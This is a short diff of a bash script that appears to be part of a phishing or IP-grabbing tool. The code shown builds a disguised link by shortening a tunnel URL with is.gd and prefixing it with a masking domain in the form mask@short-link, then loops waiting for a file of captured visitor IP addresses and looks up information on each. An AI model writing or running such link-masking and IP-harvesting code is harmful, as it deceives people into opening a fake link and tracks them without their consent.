@@ -113,10 +113,12 @@ if [[ "$msk" != http://* ]] || [[ "$msk" != https://* ]]; then
     msk="https://$msk.com"
 fi
 
+echo "[-] Starting"
 cd .server && rm -f index.php
 make_php "$msk"
 ini_cloud
 cd "$loc"
+
 req=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${fkurl})
 is_gd=${req#https://}
 new_url=$msk@$is_gd
@@ -124,7 +126,7 @@ echo "$new_url"
 
 echo "[-] Info: "
 while true; do
-    if [[ -e ".server/index.php" ]]; then
+    if [[ -e ".server/ip.txt" ]]; then
         ip=$(cat .server/ip.txt)
         get_info "$ip"
         echo -e "\n\n"
